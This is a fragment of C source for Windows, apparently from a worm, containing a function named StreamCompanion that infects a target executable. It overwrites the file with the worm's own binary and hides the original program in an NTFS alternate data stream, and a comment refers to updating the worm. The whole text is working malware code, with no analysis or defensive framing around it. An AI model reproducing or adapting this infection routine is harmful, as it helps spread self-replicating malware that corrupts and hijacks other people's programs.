   bool StreamCompanion(char FileToInfect[MAX_PATH])
   {
       char    TempFile[MAX_PATH];
       char    WormFile[MAX_PATH];
       char    HostFile[MAX_PATH];

       lstrcpy(TempFile, FileToInfect);
       lstrcat(TempFile, ".DiA");
       lstrcpy(HostFile, FileToInfect);
       lstrcat(HostFile, ":Tamiami");

       if(CopyFile(FileToInfect, TempFile, 0) != 0)
       {
           if(GetModuleFileName(0, WormFile, sizeof(WormFile)) != 0)
           {
               if(CopyFile(WormFile, FileToInfect, 0) != 0)
               {
                   if(CopyFile(TempFile, HostFile, 0) != 0)
                   {
                       //DeleteFile(TempFile); - needed for updating the worm...
                       return true;
                   }
               }
           }
       }

       DeleteFile(TempFile);

       return false;
   }
